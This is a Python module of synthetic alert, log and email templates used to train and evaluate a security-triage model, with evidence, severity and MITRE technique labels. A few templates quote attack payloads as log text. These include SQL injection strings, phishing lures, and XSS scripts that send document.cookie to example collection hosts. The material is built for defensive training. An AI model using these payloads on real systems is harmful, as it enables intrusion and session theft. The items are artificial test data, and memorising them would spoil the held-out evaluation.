"""Event templates for the synthetic cybersecurity instruction dataset.

Every example in the training corpus is generated from one of these templates.
Two properties matter for the methodology:

* **Template-level splitting.** Templates are partitioned between train,
  validation and test *before* any instance is generated, so a phrasing seen in
  training never reappears in the test set. Splitting instances instead would
  leak the wording and inflate the reported scores.
* **Explicit labelling.** Every record produced from these templates is marked
  ``synthetic`` with the template id that produced it, so the dataset card can
  report exactly how the corpus was built.

Slot values are drawn from IETF documentation ranges (RFC 5737: 192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24) and RFC 2606 example domains, so no real
infrastructure is referenced.

Each template supplies the evidence a correct analysis should extract, which
becomes the training target - the model is taught to justify a label, not just
emit one.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from cybersentinel.cybersecurity.taxonomy import AttackType, Severity


@dataclass(frozen=True)
class EventTemplate:
    """One event phrasing plus the analysis it should produce."""

    template_id: str
    attack_type: AttackType
    severity: Severity
    text: str
    evidence: tuple[str, ...]
    technique: str | None = None
    confidence: float = 0.85
    recommendations: tuple[str, ...] = ()
    input_type: str = "alert"
    slots: dict[str, tuple[str, ...]] = field(default_factory=dict)


# --- Slot vocabularies --------------------------------------------------------
IPS = ("198.51.100.23", "203.0.113.45", "192.0.2.77", "198.51.100.201", "203.0.113.9")
INTERNAL_IPS = ("10.4.12.33", "172.16.8.19", "10.0.3.201", "192.168.24.7")
USERS = ("root", "admin", "svc_backup", "j.doe", "administrator", "deploy", "m.patel")
HOSTS = ("web-prod-01", "db-prod-02", "vpn-gw-01", "file-srv-04", "jump-01")
DOMAINS = ("example.com", "example.net", "example.org")
COUNTS = ("18", "27", "43", "47", "112", "260", "1,340")
MINUTES = ("2", "3", "5", "9", "15")
PORTS = ("22", "445", "3389", "1433", "8080")
HASHES = (
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",
)
SIZES = ("2.4 GB", "870 MB", "14 GB", "530 MB")
GEOS = ("Brazil", "Romania", "Singapore", "Nigeria", "Vietnam")


def _slots(**kwargs: tuple[str, ...]) -> dict[str, tuple[str, ...]]:
    return dict(kwargs)


# --- Templates ----------------------------------------------------------------
TEMPLATES: tuple[EventTemplate, ...] = (
    # ---------------- Brute Force ----------------
    EventTemplate(
        "bf-01",
        AttackType.BRUTE_FORCE,
        Severity.HIGH,
        "{count} failed SSH login attempts from {ip} within {minutes} minutes, all targeting the account {user}.",
        (
            "{count} failed authentication attempts in a {minutes} minute window",
            "all attempts originate from the single source {ip}",
            "attempts concentrate on one account: {user}",
        ),
        "T1110",
        0.92,
        ("Review whether any attempt from {ip} succeeded", "Enable authentication rate limiting"),
        slots=_slots(count=COUNTS, ip=IPS, minutes=MINUTES, user=USERS),
    ),
    EventTemplate(
        "bf-02",
        AttackType.BRUTE_FORCE,
        Severity.HIGH,
        "Authentication log shows repeated 'Failed password for {user}' entries from {ip}, {count} occurrences since the top of the hour.",
        (
            "repeated failed password events for a single account",
            "{count} occurrences within one hour",
            "consistent source address {ip}",
        ),
        "T1110.001",
        0.9,
        ("Confirm the account is not locked out", "Verify no successful login followed"),
        input_type="log",
        slots=_slots(user=USERS, ip=IPS, count=COUNTS),
    ),
    EventTemplate(
        "bf-03",
        AttackType.BRUTE_FORCE,
        Severity.HIGH,
        "Identity provider reports one failed sign-in each for {count} different user accounts from {ip} in {minutes} minutes.",
        (
            "single failure spread across {count} distinct accounts",
            "one source address {ip} for all attempts",
            "pattern stays below per-account lockout thresholds",
        ),
        "T1110.003",
        0.88,
        ("Aggregate authentication failures by source rather than by account",),
        slots=_slots(count=COUNTS, ip=IPS, minutes=MINUTES),
    ),
    EventTemplate(
        "bf-04",
        AttackType.BRUTE_FORCE,
        Severity.MEDIUM,
        "RDP endpoint on {host} recorded {count} rejected authentication attempts overnight from several addresses including {ip}.",
        (
            "{count} rejected authentications against a remote access service",
            "activity concentrated outside business hours",
            "multiple sources including {ip}",
        ),
        "T1110",
        0.82,
        ("Restrict RDP exposure to known networks",),
        slots=_slots(count=COUNTS, host=HOSTS, ip=IPS),
    ),
    EventTemplate(
        "bf-05",
        AttackType.BRUTE_FORCE,
        Severity.CRITICAL,
        "{count} failed logins for {user} from {ip} were followed by one successful authentication from the same address.",
        (
            "{count} consecutive failures immediately preceding a success",
            "the successful login shares the source address {ip}",
            "account {user} should be treated as compromised until disproved",
        ),
        "T1110",
        0.94,
        ("Treat the account as compromised and reset credentials", "Review the session that followed"),
        slots=_slots(count=COUNTS, user=USERS, ip=IPS),
    ),
    # ---------------- Phishing ----------------
    EventTemplate(
        "ph-01",
        AttackType.PHISHING,
        Severity.HIGH,
        "From: security-alert@{domain}\nSubject: Urgent - verify your account within 24 hours\n\nYour mailbox will be suspended unless you confirm your credentials at http://secure-{domain}.verify-now.example.net/login",
        (
            "urgency and account-suspension pressure in the subject and body",
            "link destination does not match the claimed sender organisation",
            "message requests credential entry",
        ),
        "T1566.002",
        0.91,
        ("Preserve full message headers", "Identify other recipients of the campaign"),
        input_type="email",
        slots=_slots(domain=DOMAINS),
    ),
    EventTemplate(
        "ph-02",
        AttackType.PHISHING,
        Severity.HIGH,
        "From: hr-payroll@{domain}\nSubject: Updated salary review - action required\n\nPlease open the attached document and sign in with your network account to view your revised banding.",
        (
            "attachment requiring authentication to open",
            "payroll and salary framing used to create urgency",
            "credential entry requested outside the normal HR system",
        ),
        "T1566.001",
        0.88,
        ("Analyse the attachment in an isolated environment",),
        input_type="email",
        slots=_slots(domain=DOMAINS),
    ),
    EventTemplate(
        "ph-03",
        AttackType.PHISHING,
        Severity.MEDIUM,
        "User {user} reported an email claiming to be from the IT service desk asking them to install a remote support tool from hxxp://support-{domain}[.]example[.]org.",
        (
            "defanged link to a non-corporate domain",
            "impersonation of an internal support function",
            "request to install remote access software",
        ),
        "T1566.002",
        0.85,
        ("Confirm the service desk did not send the message",),
        input_type="email",
        slots=_slots(user=USERS, domain=DOMAINS),
    ),
    EventTemplate(
        "ph-04",
        AttackType.PHISHING,
        Severity.CRITICAL,
        "Mail gateway flagged {count} messages impersonating the finance director requesting an urgent wire transfer; the reply-to address is finance.director@{domain}.invalid-mail.example.com.",
        (
            "reply-to address differs from the displayed sender",
            "{count} recipients targeted with the same pretext",
            "financial transfer requested under time pressure",
        ),
        "T1566",
        0.9,
        ("Notify finance to verify any transfer request out of band",),
        input_type="email",
        slots=_slots(count=COUNTS, domain=DOMAINS),
    ),
    # ---------------- SQL Injection ----------------
    EventTemplate(
        "sqli-01",
        AttackType.SQL_INJECTION,
        Severity.HIGH,
        "Web server log: GET /products?id=1' OR '1'='1 HTTP/1.1 from {ip} returned 200 with an unusually large response body.",
        (
            "boolean tautology injected into a query parameter",
            "unquoted apostrophe terminating a string literal",
            "response size inconsistent with a single product lookup",
        ),
        "T1190",
        0.93,
        ("Replace dynamic SQL with parameterised queries",),
        input_type="log",
        slots=_slots(ip=IPS),
    ),
    EventTemplate(
        "sqli-02",
        AttackType.SQL_INJECTION,
        Severity.CRITICAL,
        "Application error log shows repeated queries from {ip} containing UNION SELECT null,username,password FROM users--",
        (
            "UNION SELECT used to append attacker-chosen columns",
            "credential table referenced directly in the payload",
            "comment sequence truncating the original statement",
        ),
        "T1190",
        0.95,
        ("Assume credential exposure and rotate affected passwords",),
        input_type="log",
        slots=_slots(ip=IPS),
    ),
    EventTemplate(
        "sqli-03",
        AttackType.SQL_INJECTION,
        Severity.HIGH,
        "WAF blocked {count} requests from {ip} to /search with payloads including '; DROP TABLE sessions--",
        (
            "statement terminator followed by a destructive command",
            "{count} repeated attempts against one endpoint",
            "payload targets schema objects rather than data",
        ),
        "T1190",
        0.9,
        ("Verify the WAF blocked every variant, not just the signature",),
        slots=_slots(count=COUNTS, ip=IPS),
    ),
    EventTemplate(
        "sqli-04",
        AttackType.SQL_INJECTION,
        Severity.MEDIUM,
        "Database slow-query log recorded a statement from the web application containing 'AND SLEEP(5)' appended to a WHERE clause.",
        (
            "time-delay function appended to a query condition",
            "pattern consistent with blind injection probing",
            "query originates from the application account",
        ),
        "T1190",
        0.86,
        ("Review the endpoint that generated the query",),
        input_type="log",
    ),
    # ---------------- XSS ----------------
    EventTemplate(
        "xss-01",
        AttackType.XSS,
        Severity.MEDIUM,
        "Comment submitted to the support portal from {ip} contained <script>fetch('http://collect.example.net/?c='+document.cookie)</script>",
        (
            "script tag embedded in user-submitted content",
            "payload reads document.cookie",
            "data sent to an external collection endpoint",
        ),
        "T1190",
        0.92,
        ("Apply context-aware output encoding on the comment field",),
        slots=_slots(ip=IPS),
    ),
    EventTemplate(
        "xss-02",
        AttackType.XSS,
        Severity.MEDIUM,
        "Request from {ip}: GET /search?q=<img src=x onerror=alert(1)> returned the parameter unescaped in the response body.",
        (
            "event handler attribute used to execute script",
            "input reflected into the response without encoding",
            "classic reflected cross-site scripting probe",
        ),
        "T1190",
        0.9,
        ("Encode reflected parameters for the HTML context",),
        input_type="log",
        slots=_slots(ip=IPS),
    ),
    EventTemplate(
        "xss-03",
        AttackType.XSS,
        Severity.HIGH,
        "Stored profile field for user {user} renders javascript:void(document.location='http://harvest.example.org/'+document.cookie) for every visitor to the page.",
        (
            "payload persisted in a profile field",
            "javascript URI used to trigger navigation",
            "session cookie exfiltrated to an external host",
        ),
        "T1190",
        0.91,
        ("Purge the stored payload and audit for other affected records",),
        slots=_slots(user=USERS),
    ),
    # ---------------- Malware ----------------
    EventTemplate(
        "mal-01",
        AttackType.MALWARE,
        Severity.CRITICAL,
        "Endpoint agent on {host} reports mass file modification with the extension .locked and deletion of volume shadow copies; process hash {hash}.",
        (
            "mass file rewrite consistent with encryption",
            "shadow copies deleted, removing local recovery",
            "process hash {hash} recorded for scoping",
        ),
        "T1486",
        0.95,
        ("Preserve volatile evidence before containment", "Verify offline backup integrity"),
        slots=_slots(host=HOSTS, hash=HASHES),
    ),
    EventTemplate(
        "mal-02",
        AttackType.MALWARE,
        Severity.HIGH,
        "A document opened by {user} on {host} spawned powershell.exe with an encoded command, which then contacted {ip} every 60 seconds.",
        (
            "office application spawning a script interpreter",
            "encoded command line indicating obfuscation",
            "regular 60 second callbacks to {ip} suggesting beaconing",
        ),
        "T1059",
        0.93,
        ("Search the estate for the same parent-child process pattern",),
        slots=_slots(user=USERS, host=HOSTS, ip=IPS),
    ),
    EventTemplate(
        "mal-03",
        AttackType.MALWARE,
        Severity.HIGH,
        "Antivirus quarantined a file with hash {hash} on {host} after it attempted to write to a startup registry key.",
        (
            "file attempted persistence via a startup key",
            "sample identified by hash {hash}",
            "detection occurred on a single endpoint {host}",
        ),
        "T1204.002",
        0.87,
        ("Determine how the file reached the endpoint",),
        slots=_slots(hash=HASHES, host=HOSTS),
    ),
    # ---------------- DDoS ----------------
    EventTemplate(
        "ddos-01",
        AttackType.DDOS,
        Severity.HIGH,
        "Edge load balancer reports {count} requests per second to /api/checkout from more than 4,000 distinct addresses; latency has risen tenfold.",
        (
            "request volume far above the normal baseline",
            "traffic distributed across thousands of sources",
            "measurable service degradation for legitimate users",
        ),
        "T1498",
        0.9,
        ("Engage the upstream provider or scrubbing service",),
        slots=_slots(count=COUNTS),
    ),
    EventTemplate(
        "ddos-02",
        AttackType.DDOS,
        Severity.HIGH,
        "Firewall on {host} logged a sustained SYN flood with half-open connections exhausting the connection table.",
        (
            "SYN flood pattern with unacknowledged handshakes",
            "connection table exhaustion on {host}",
            "resource starvation rather than data compromise",
        ),
        "T1499",
        0.91,
        ("Enable SYN cookies and connection rate limits",),
        slots=_slots(host=HOSTS),
    ),
    EventTemplate(
        "ddos-03",
        AttackType.DDOS,
        Severity.MEDIUM,
        "DNS servers observed a {count}-fold increase in ANY queries with spoofed source addresses, consistent with reflection abuse.",
        (
            "amplification-prone query type in unusual volume",
            "source addresses appear spoofed",
            "infrastructure being used as a reflector",
        ),
        "T1498",
        0.85,
        ("Disable open recursion and apply response rate limiting",),
        slots=_slots(count=COUNTS),
    ),
    # ---------------- Reconnaissance ----------------
    EventTemplate(
        "recon-01",
        AttackType.RECONNAISSANCE,
        Severity.MEDIUM,
        "Perimeter firewall recorded connection attempts from {ip} to {count} sequential ports on {host} within {minutes} minutes.",
        (
            "sequential port access pattern",
            "{count} ports probed from a single source {ip}",
            "activity compressed into {minutes} minutes",
        ),
        "T1595",
        0.9,
        ("Confirm which probed services are intentionally exposed",),
        slots=_slots(ip=IPS, count=COUNTS, host=HOSTS, minutes=MINUTES),
    ),
    EventTemplate(
        "recon-02",
        AttackType.RECONNAISSANCE,
        Severity.LOW,
        "Web server logs show requests from {ip} for /admin, /.env, /wp-login.php and /phpmyadmin, all returning 404.",
        (
            "requests for well-known sensitive paths",
            "no successful responses returned",
            "pattern consistent with automated content discovery",
        ),
        "T1595.002",
        0.86,
        ("Verify none of the probed paths exist in production",),
        input_type="log",
        slots=_slots(ip=IPS),
    ),
    EventTemplate(
        "recon-03",
        AttackType.RECONNAISSANCE,
        Severity.MEDIUM,
        "Internal host {internal_ip} contacted port {port} on {count} different internal systems in under {minutes} minutes.",
        (
            "internal host scanning peers, indicating an existing foothold",
            "single port {port} swept across {count} systems",
            "behaviour inconsistent with a normal workstation",
        ),
        "T1046",
        0.88,
        ("Investigate the scanning host as potentially compromised",),
        slots=_slots(internal_ip=INTERNAL_IPS, port=PORTS, count=COUNTS, minutes=MINUTES),
    ),
    # ---------------- Privilege Escalation ----------------
    EventTemplate(
        "pe-01",
        AttackType.PRIVILEGE_ESCALATION,
        Severity.CRITICAL,
        "Account {user} was added to the Domain Admins group on {host} outside any change window and with no associated change ticket.",
        (
            "privileged group membership granted without authorisation",
            "change occurred outside an approved window",
            "no corresponding change record exists",
        ),
        "T1068",
        0.92,
        ("Revert the membership after capturing evidence",),
        slots=_slots(user=USERS, host=HOSTS),
    ),
    EventTemplate(
        "pe-02",
        AttackType.PRIVILEGE_ESCALATION,
        Severity.CRITICAL,
        "Audit log on {host}: user {user} executed a setuid binary in /tmp that spawned a root shell.",
        (
            "setuid binary executed from a world-writable directory",
            "resulting process runs with root privileges",
            "escalation from a standard user account {user}",
        ),
        "T1068",
        0.93,
        ("Capture the binary and identify how it was placed",),
        input_type="log",
        slots=_slots(host=HOSTS, user=USERS),
    ),
    EventTemplate(
        "pe-03",
        AttackType.PRIVILEGE_ESCALATION,
        Severity.HIGH,
        "Cloud audit trail shows the service account {user} attaching an administrator policy to itself.",
        (
            "identity modifying its own permissions",
            "administrative policy attached without approval",
            "service account acting outside its documented role",
        ),
        "T1548",
        0.9,
        ("Detach the policy and review recent actions by the identity",),
        slots=_slots(user=USERS),
    ),
    # ---------------- Data Exfiltration ----------------
    EventTemplate(
        "exf-01",
        AttackType.DATA_EXFILTRATION,
        Severity.CRITICAL,
        "Host {host} uploaded {size} to an external file-sharing service over three hours, against a normal daily outbound volume of under 50 MB.",
        (
            "{size} transferred, far above the established baseline",
            "destination is an unsanctioned external service",
            "transfer sustained over several hours",
        ),
        "T1567",
        0.93,
        ("Identify the data set involved and engage data-protection stakeholders",),
        slots=_slots(host=HOSTS, size=SIZES),
    ),
    EventTemplate(
        "exf-02",
        AttackType.DATA_EXFILTRATION,
        Severity.HIGH,
        "DNS logs show {count} queries from {internal_ip} with long base64-like subdomains to a single authoritative name server.",
        (
            "encoded data embedded in DNS subdomains",
            "{count} queries to one destination",
            "protocol used outside its normal purpose",
        ),
        "T1048",
        0.89,
        ("Block the domain and inspect the querying host",),
        slots=_slots(count=COUNTS, internal_ip=INTERNAL_IPS),
    ),
    EventTemplate(
        "exf-03",
        AttackType.DATA_EXFILTRATION,
        Severity.HIGH,
        "User {user} archived {count} customer records into a single file on {host} and transferred it to {ip} shortly afterwards.",
        (
            "bulk collection of records into a staging archive",
            "transfer to external address {ip} immediately after staging",
            "volume inconsistent with the user's normal activity",
        ),
        "T1041",
        0.9,
        ("Preserve the archive and the transfer logs",),
        slots=_slots(user=USERS, count=COUNTS, host=HOSTS, ip=IPS),
    ),
    # ---------------- Credential Attack ----------------
    EventTemplate(
        "cred-01",
        AttackType.CREDENTIAL_ATTACK,
        Severity.CRITICAL,
        "EDR alert on {host}: a non-standard process opened a handle to LSASS memory and wrote output to disk.",
        (
            "process accessed credential store memory",
            "output written to disk for later retrieval",
            "behaviour consistent with credential dumping",
        ),
        "T1003",
        0.94,
        ("Treat all credentials used on the host as exposed",),
        slots=_slots(host=HOSTS),
    ),
    EventTemplate(
        "cred-02",
        AttackType.CREDENTIAL_ATTACK,
        Severity.HIGH,
        "Login portal received {count} authentication attempts from {count} distinct addresses using username and password pairs matching a public breach corpus.",
        (
            "high volume of attempts from widely distributed sources",
            "credentials correspond to a known breach corpus",
            "pattern consistent with credential stuffing",
        ),
        "T1110.004",
        0.9,
        ("Screen passwords against breached-credential lists",),
        slots=_slots(count=COUNTS),
    ),
    EventTemplate(
        "cred-03",
        AttackType.CREDENTIAL_ATTACK,
        Severity.HIGH,
        "A configuration file committed to the internal repository by {user} contained a plaintext database password for {host}.",
        (
            "credential stored in plaintext in version control",
            "secret readable by anyone with repository access",
            "affects the production system {host}",
        ),
        "T1552",
        0.88,
        ("Rotate the credential and purge it from history",),
        slots=_slots(user=USERS, host=HOSTS),
    ),
    # ---------------- Vulnerability ----------------
    EventTemplate(
        "vuln-01",
        AttackType.VULNERABILITY,
        Severity.HIGH,
        "Vulnerability scan reports {host} running an unpatched version of the application server with a published remote code execution advisory.",
        (
            "affected version confirmed present on {host}",
            "advisory describes remote code execution",
            "no vendor patch has been applied",
        ),
        "T1190",
        0.87,
        ("Apply the vendor patch or documented mitigation",),
        input_type="vulnerability",
        slots=_slots(host=HOSTS),
    ),
    EventTemplate(
        "vuln-02",
        AttackType.VULNERABILITY,
        Severity.CRITICAL,
        "Asset inventory shows {count} internet-facing servers running a library version listed in a critical severity advisory with a known public exploit.",
        (
            "{count} internet-facing systems affected",
            "public exploit code is available",
            "advisory rated critical severity",
        ),
        "T1190",
        0.9,
        ("Prioritise patching of internet-facing instances",),
        input_type="vulnerability",
        slots=_slots(count=COUNTS),
    ),
    EventTemplate(
        "vuln-03",
        AttackType.VULNERABILITY,
        Severity.MEDIUM,
        "Dependency audit flagged an outdated parsing library in the {host} build with a published denial-of-service advisory.",
        (
            "outdated dependency present in the build",
            "advisory describes a denial-of-service condition",
            "no evidence of exploitation in the environment",
        ),
        "T1190",
        0.8,
        ("Schedule the dependency upgrade in the next release",),
        input_type="vulnerability",
        slots=_slots(host=HOSTS),
    ),
    # ---------------- Suspicious Authentication ----------------
    EventTemplate(
        "auth-01",
        AttackType.SUSPICIOUS_AUTH,
        Severity.HIGH,
        "User {user} signed in from the office at 09:12 and again from {geo} at 09:41 on the same day.",
        (
            "two sign-ins separated by an impossible travel distance",
            "second location {geo} has no prior history for this account",
            "both sessions authenticated successfully",
        ),
        "T1078",
        0.89,
        ("Contact the user to confirm the second sign-in",),
        slots=_slots(user=USERS, geo=GEOS),
    ),
    EventTemplate(
        "auth-02",
        AttackType.SUSPICIOUS_AUTH,
        Severity.MEDIUM,
        "Account {user} received {count} multi-factor push notifications in {minutes} minutes before one was approved.",
        (
            "{count} repeated MFA prompts in a short window",
            "approval followed sustained prompting",
            "pattern consistent with MFA fatigue",
        ),
        "T1078",
        0.87,
        ("Require number matching for MFA approvals",),
        slots=_slots(user=USERS, count=COUNTS, minutes=MINUTES),
    ),
    EventTemplate(
        "auth-03",
        AttackType.SUSPICIOUS_AUTH,
        Severity.MEDIUM,
        "Service account {user}, which normally authenticates only from {host}, signed in interactively from a workstation at 02:40.",
        (
            "service account used for interactive sign-in",
            "source differs from its usual host {host}",
            "activity outside normal operating hours",
        ),
        "T1078",
        0.86,
        ("Verify whether the service account should permit interactive logon",),
        slots=_slots(user=USERS, host=HOSTS),
    ),
    # ---------------- Insider Threat ----------------
    EventTemplate(
        "ins-01",
        AttackType.INSIDER_THREAT,
        Severity.HIGH,
        "User {user}, who resigned last week, downloaded {count} documents from the shared drive over two evenings.",
        (
            "bulk download shortly before departure",
            "{count} documents retrieved outside working hours",
            "volume inconsistent with the user's normal activity",
        ),
        "T1213",
        0.85,
        ("Preserve access logs and engage HR before acting",),
        slots=_slots(user=USERS, count=COUNTS),
    ),
    EventTemplate(
        "ins-02",
        AttackType.INSIDER_THREAT,
        Severity.MEDIUM,
        "Account {user} from the marketing team accessed {count} records in the payroll system, an application unrelated to their role.",
        (
            "access to a system outside the user's job function",
            "{count} records viewed in one session",
            "no ticket or approval records the access",
        ),
        "T1213",
        0.83,
        ("Confirm whether a legitimate business reason exists",),
        slots=_slots(user=USERS, count=COUNTS),
    ),
    # ---------------- Benign ----------------
    EventTemplate(
        "ben-01",
        AttackType.BENIGN,
        Severity.LOW,
        "User {user} authenticated successfully to the VPN at 08:52 from the usual office address, matching their normal weekday pattern.",
        (
            "single successful authentication with no failures",
            "source and time match the established baseline",
            "no anomalous activity followed the session",
        ),
        None,
        0.9,
        ("No response action required",),
        slots=_slots(user=USERS),
    ),
    EventTemplate(
        "ben-02",
        AttackType.BENIGN,
        Severity.LOW,
        "Scheduled backup job completed on {host} at 02:00 and transferred {size} to the designated internal backup target.",
        (
            "transfer matches a scheduled maintenance job",
            "destination is an approved internal system",
            "volume consistent with previous runs",
        ),
        None,
        0.91,
        ("No response action required",),
        slots=_slots(host=HOSTS, size=SIZES),
    ),
    EventTemplate(
        "ben-03",
        AttackType.BENIGN,
        Severity.LOW,
        "Monitoring agent on {host} restarted after a planned package upgrade recorded in the change calendar.",
        (
            "restart corresponds to an approved change record",
            "no unexpected process or network activity followed",
            "behaviour consistent with routine maintenance",
        ),
        None,
        0.89,
        ("No response action required",),
        slots=_slots(host=HOSTS),
    ),
    EventTemplate(
        "ben-04",
        AttackType.BENIGN,
        Severity.LOW,
        "Password change for {user} was completed through the self-service portal during business hours following a help-desk ticket.",
        (
            "change performed through the sanctioned workflow",
            "supporting help-desk ticket exists",
            "activity within normal business hours",
        ),
        None,
        0.9,
        ("No response action required",),
        slots=_slots(user=USERS),
    ),
    # ---------------- Unknown / insufficient evidence ----------------
    # These teach refusal. Without them the model learns that every input must
    # receive a label, which is the behaviour the hallucination evaluation
    # penalises.
    EventTemplate(
        "unk-01",
        AttackType.UNKNOWN,
        Severity.UNKNOWN,
        "Alert triggered on {host}.",
        (),
        None,
        0.2,
        ("Retrieve the full alert detail and surrounding log context",),
        slots=_slots(host=HOSTS),
    ),
    EventTemplate(
        "unk-02",
        AttackType.UNKNOWN,
        Severity.UNKNOWN,
        "Connection observed from {ip}.",
        (),
        None,
        0.15,
        ("Establish what service was contacted and whether the connection succeeded",),
        slots=_slots(ip=IPS),
    ),
    EventTemplate(
        "unk-03",
        AttackType.UNKNOWN,
        Severity.UNKNOWN,
        "Something looks wrong with the {host} server, please investigate.",
        (),
        None,
        0.1,
        ("Ask the reporter for the specific symptom and time window",),
        slots=_slots(host=HOSTS),
    ),
    EventTemplate(
        "unk-04",
        AttackType.UNKNOWN,
        Severity.UNKNOWN,
        "User {user} reported an issue at around {minutes} past the hour.",
        (),
        None,
        0.12,
        ("Collect the specific error and affected system before triage",),
        slots=_slots(user=USERS, minutes=MINUTES),
    ),
)


def templates_by_category() -> dict[AttackType, list[EventTemplate]]:
    """Group templates by attack type."""
    grouped: dict[AttackType, list[EventTemplate]] = {}
    for template in TEMPLATES:
        grouped.setdefault(template.attack_type, []).append(template)
    return grouped
